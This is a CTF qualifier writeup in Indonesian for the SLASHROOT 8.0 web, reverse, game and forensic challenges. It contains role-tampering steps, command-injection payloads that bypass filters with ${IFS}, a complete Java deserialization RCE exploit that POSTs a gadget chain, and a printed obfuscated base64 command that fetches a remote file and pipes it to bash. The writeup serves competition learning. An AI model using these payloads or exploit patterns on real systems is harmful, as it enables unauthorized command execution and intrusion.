---
title: SLASHROOT 8.0 CTF QUALS WRITEUP
author: ywdh
tags: ["ctf"]
date: 2025-10-02
---

# SLASHROOT 8.0 CTF QUALS WRITEUP

[TOC]

# Web

## Login Begin

### Deskripsi

<details>
Hallo Peserta Slashroot CTF #8, Pada Hari Ini Kita Akan Mengikuti Penyisihan CTF, Sebelum Memulai Kegiatan, Saya Sebagai Probset Ingin Menguji Kemampuan Temen" Dalam Bidang Web Hacking, Ayo Teman" Cobalah Exploit Web Sederhana Buatan Saya Dan Temukan Hak Akses Admin Dalam Sebuah Web Tersebut !, Siapa Tau Diantara Teman" Dapat Menemukan Flag Tersembunyi Di Dalam Web Tersebut.
<br><br>
http://ctf.slashrootctf.id:30011
</details>

### Langkah Penyelesaian

- Challengenya berupa black box testing, sehingga tidak diberikan source code-nya.
- Di halaman register `/register.php` ada select **role**, tanpa pikir panjang, saya langsung intercept menggunakan burp suite ketika coba register.
- Waktu register, saya ganti rolenya menjadi **admin**.

![Login Begin-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_web1-01.png)

- Alhamdulillah, flag berhasil didapatkan.

![Login Begin-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_web1-02.png)

### Flag

==slashroot8{W0w_Y0u_G00d_B3gg1nn3r}==

## Go-Ping

### Deskripsi

<details>
Let's try ping on my web
<br>
Semakin kamu merasa nyaman, sistem semakin tidak aman
<br><br>
http://ctf.slashrootctf.id:30012/
</details>

### Langkah Penyelesaian

- Diberikan challenge black box testing lagi, setelah quick analysis, jelas itu vuln **Command Injection**.
- Tapi setelah saya coba masukan payload: `127.0.0.1;ls` tidak muncul list file apa-apa.
- Tidak berhenti di situ, saya coba tambahkan opsi `-lah` ternyata terpotong `**-lah**` **not found**. Saya juga udah coba ganti spasi dengan `${IFS}` tetap not found.
- Saya coba `ls /`, tapi muncul **permission denied**.
- Saya coba cara lain yaitu menggunakan commaand `find` seperti berikut:

```bash
find${IFS}/${IFS}-name${IFS}'flag*'${IFS}-type${IFS}
```

![Go-Ping-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_web2-01.png)

- Nama file flagnya adalah `/flag_Zr8ovfVgFXqQdlbI.txt`.
- Dari sini, bisa kita ambil kesimpulan jika terdapat filter pada inputannya, yaitu **spasi akan dihilangkan (bisa kita akali dengan** `**${IFS}**`**)** dan **terdapat beberapa command yang prohibited untuk dieksekusi, seperti** `**ls**`**,** `**cat**`**, dan** `**more**`.
- Dan berikut adalah payload untuk bisa membaca flagnya, bisa menggunakan `tac`, `nl`, dan `less`, dll.

![Go-Ping-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_web2-02.png)

### Flag

==slashroot8{Rc3_W1Th_c0mM4Nd_1Nj3cT1On_1S_V3Ry_v3rY_N1Ce}==

## EZZ Momento

### Deskripsi

<details>
java is ezz... zzz...
<br>
but wait! whattt.......!?
<br><br>
http://ctf.slashrootctf.id:30013
</details>

### Langkah Penyelesaian

- Kali tidak black box testing, tapi lumayan sulit bagi yang belum pernah belajar Java.
- Jujur aja saya banyak dibantu oleh AI. Kerentanan utamanya ada pada penggunaan `ObjectInputStream` dalam class `MyHandler`.

```java
try (ObjectInputStream objectInputStream = new ObjectInputStream(exchange.getRequestBody())) {
    String response = "";
    try {
        response = objectInputStream.readObject().toString();
    } catch (ClassNotFoundException | IOException e) {
        e.printStackTrace();
        response = e.toString();
    }
    // ...
}
```

- Hal tersebut bisa menyebabkan RCE karena server langsung menerima objek yang diserialkan tanpa memvalidasinya terlebih dulu.
- Ditambah lagi ada class `Gadget` dan `Command` yang dapat membuat proses eksploitasi lebih mudah. Di mana class `Command` memungkinkan eksekusi perintah sistem secara langsung. Dan class `Gadget` akan memanggil method `run()` dari `Command` saat `toString()` dipanggil.
- Kemudian saya diberikan script `Exploit.java` menggunakan **Reflection** oleh AI untuk mencoba RCE. Setelah beberapa kali penyesuaian karena issue package-package di Java akhirnya bisa juga :)
- Berikut ini adalah exploit scriptnya:

```java
// Script ini terletak di `src/main/java`

import com.dimas.Command;
import com.dimas.Gadget;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class Exploit {
    public static void main(String[] args) throws Exception {
        // Buat objek Command menggunakan konstruktor tanpa argumen
        Command cmd = new Command();
        
        // Gunakan refleksi untuk mengakses dan mengubah field 'command'
        Field commandField = Command.class.getDeclaredField("command");
        commandField.setAccessible(true);
        commandField.set(cmd, "cat /flag.txt");
        
        // Bungkus Command dalam Gadget
        Gadget gadget = new Gadget(cmd);
        
        // Serialisasi objek Gadget
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(gadget);
        oos.close();
        
        // Encode payload ke Base64
        String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
        
        // Kirim payload ke server
        URL url = new URL("http://ctf.slashrootctf.id:30013");
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.getOutputStream().write(Base64.getDecoder().decode(payload));
        
        // Baca respons dari server
        java.util.Scanner s = new java.util.Scanner(con.getInputStream()).useDelimiter("\\A");
        String response = s.hasNext() ? s.next() : "";
        System.out.println("Server response: " + response);
    }
}
```

- Alhamdulillah, berhasil solve semua soal web exploit :))

![EZZ Momento-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_web3-01.png)

### Flag

==slashroot8{it_is_really_private_UwU}==

# Joy

## Package Delivery

### Deskripsi

<details>
A game about a mundane task...
<br>
Some say if you deliver an exact number of packages, a magic text will appear??
</details>

### Langkah Penyelesaian

- Challenge ini sangat mudah dari yang saya bayangkan, hanya modal `strings` langsung solve.
- Awalnya saya coba mainkan gamenya dulu siapa tau ada anomali kan wkwk.
- Ternyata di harus sampe score 9999 baru ada gift spesial (mungkin aja flag).
- Ngapain harus se-effort itu kan, lalu saya coba quick analysis file `.pck` untuk nemuin something interest.
- Alhamdulillah, ketika saya coba cari **"slashroot"** langsung ketemu flagnya. Agak curiga sih di awal kenapa semudah itu, tapi gas ajalah wkwk.

![Package Delivery-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_joy1-01.png)

### Flag

==slashroot8{N0T90Nn4l1e_tH4T_w45_E45y_hUh?}==


# Reverse

## baby-lua

### Deskripsi

<details>
lua but baby
</details>

### Langkah Penyelesaian

- Disclaimer dulu, saya gak jago Reverse ya ges, iseng-iseng aja ini.
- Setelah saya coba decompile menggunakan Ghidra, ada something interesting di fungsi `init()`, di mana mengeksekusi command seperti berikut.

```c=
int init(EVP_PKEY_CTX *ctx)

{
  int iVar1;
  char local_408 [1024];
  
  sprintf(local_408,
          "echo d2dldCAtcSAtTyAvdG1wL3V3dSBodHRwczovL2FpbWFyLmlkL2ZsYWcubHVhYw== | base64 -d | bash"
         );
  iVar1 = system(local_408);
  return iVar1;
}
```

- Ketika saya coba execute command tersebut di local machine, ada file `uwu` di direktori `/tmp`. Saya coba cek file apakah itu, ternyata merupakan file bytecode dalam bahasa Lua.
- Langsung saja saya decompile bytecode itu dan ini hasilnya.

```lua=
    -- filename: 
    -- version: lua52
    -- line: [0, 0] id: 0
    check_flag = function(r0_1)
    -- line: [1, 45] id: 1
    local r1_1 = {
        0,
        1,
        1,
        1,
        0,
       ... omitted ...,
        0,
        1,
        1,
        1,
        1,
        1,
        0,
        1
    }
    local r2_1 = ""
    for r6_1 = 1, #r0_1, 1 do
        local r8_1 = string.byte(r0_1:sub(r6_1, r6_1))
        for r12_1 = 7, 0, -1 do
        if 2 ^ r12_1 <= r8_1 then
            r2_1 = r2_1 .. "1"
            r8_1 = r8_1 - 2 ^ r12_1
        else
            r2_1 = r2_1 .. "0"
        end
        end
    end
    if #r2_1 ~= #r1_1 then
        return false
    end
    local r3_1 = 0
    for r7_1 = 1, #r1_1, 1 do
        if tonumber(r2_1:sub(r7_1, r7_1)) == r1_1[r7_1] then
        r3_1 = r3_1 + 1
        end
    end
    local r4_1 = r2_1 == table.concat(r1_1)
    end
```

- Kode Lua di atas tampaknya melakukan pengecekan flag dengan mengubah input menjadi representasi biner dan membandingkannya dengan array biner yang telah ditentukan.
- Langsung saja saya buat solver scriptnya menggunakan Python3.

```python=
# Function to decode flag from binary array
def decode_flag(binary_array):
    # Convert binary array to string
    binary_string = ''.join(map(str, binary_array))
    
    # Split binary string into 8-bit chunks
    chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    
    # Convert each chunk to character
    flag = ''.join([chr(int(chunk, 2)) for chunk in chunks])
    
    return flag

# Binary array from the Lua code
binary_array = [
    0,1,1,1,0,0,1,1,0,1,1,0,1,1,0,0,0,1,1,0,0,0,0,1,0,1,1,1,0,0,1,1,
    0,1,1,0,1,0,0,0,0,1,1,1,0,0,1,0,0,1,1,0,1,1,1,1,0,1,1,0,1,1,1,1,
    0,1,1,1,0,1,0,0,0,0,1,1,1,0,0,0,0,1,1,1,1,0,1,1,0,1,1,0,0,1,0,1,
    0,1,1,1,1,0,1,0,0,1,0,1,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,0,1,1,1,0,
    0,0,1,1,0,0,1,1,0,1,0,1,1,1,1,1,0,1,1,0,0,1,1,0,0,0,1,1,0,0,0,0,
    0,1,1,1,0,0,1,0,0,1,0,1,1,1,1,1,0,1,1,1,1,0,0,1,0,0,1,1,0,0,0,0,
    0,1,1,1,0,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,0,0,1,1,0,1,1,0,0,1,0,1,
    0,1,1,0,0,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,1,0,0,1,0,0,1,1,0,0,0,0,
    0,1,1,1,0,1,0,1,0,1,0,1,1,1,1,1,0,0,1,1,0,0,0,1,0,1,1,0,1,1,1,0,
    0,1,0,1,1,1,1,1,0,1,1,0,0,1,1,0,0,0,1,1,0,0,0,1,0,1,1,0,1,1,1,0,
    0,0,1,1,0,1,0,0,0,1,1,0,1,1,0,0,0,1,1,1,1,1,0,1
]

flag = decode_flag(binary_array)
print("Flag:", flag)
```

### Flag

==slashroot8{ez_0n3_f0r_y0u_see_y0u_1n_f1n4l}==

# Forensic

## Find The Key

### Deskripsi

<details>
Temukan key = solve
<br>
Filename: ssstttttt.unknown
</details>

### Langkah Penyelesaian

- Saya coba liat file signature dari file tersebut, sepertinya terpotong. Bisa dilihat pada gambar di bawah, 3 digit hex yang di-highlight sepertinya indikasi file JPG.

![Find The Key-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-01.png)

- Setelah saya coba fix dengan file signature yang sesuai, tidak ada flag yang muncul.

![Find The Key-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-02.png)

- Analisis selanjutnya yaitu mengecek bagian human readable dari file tersebut dengan `strings`.

![Find The Key-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-03.png)

- Nampak sebuah flag tapi formatnya salah, terbukti ketika dicoba submit, baik dengan kelebihan **r** atau pun tidak hasilnya tetap incorrect.
- Saya coba decode nilai hex di bawahnya, flagnya masih incorrect.

![Find The Key-04](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-04.png)

- Kemudian, saya coba kode binary yang di bawahnya, berikut hasil konversi ke ascii (text).

![Find The Key-05](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-05.png)

- Hmm, sebuah flag juga, tapi ketika coba submit masih incorrect.
- Saya coba decode nilai hex yang di atas flag awal, hasilnya adalah `admin123`.

![Find The Key-06](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-06.png)

- Sejenak saya berpikir mungkin saja itu sebuah password, but for what ?? Apakah ini sebuah file archive yang diproteksi password ?
- Saya coba cari nilai hex yang relevan dengan file signature zip yaitu `50 4B 03 04`, ternyata ada dong dan itu **berulang sebanyak 4 kali**.

![Find The Key-07](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-07.png)

- Ketika file signaturenya diganti dari jpg ke zip beneran bisa dong.

![Find The Key-08](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-08.png)

- Saya coba baca isi file tersebut, rata-rata semuanya di-encode menggunakan base64 dan ternyata di dalamnya ada banyak sekali flag palsu. Sampai pada akhirnya, alhamdulillah saya berhasil ketemu flag aslinya sebelum nilai binary.

![Find The Key-09](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/slashroot8_foren1-09.png)

- Bang jangan di prank mulu donk, udah salah berape kali gw :v.

### Flag

==slashroot8{Y4n9_b1k1n_s04l_m4s1h_p3mul4}==
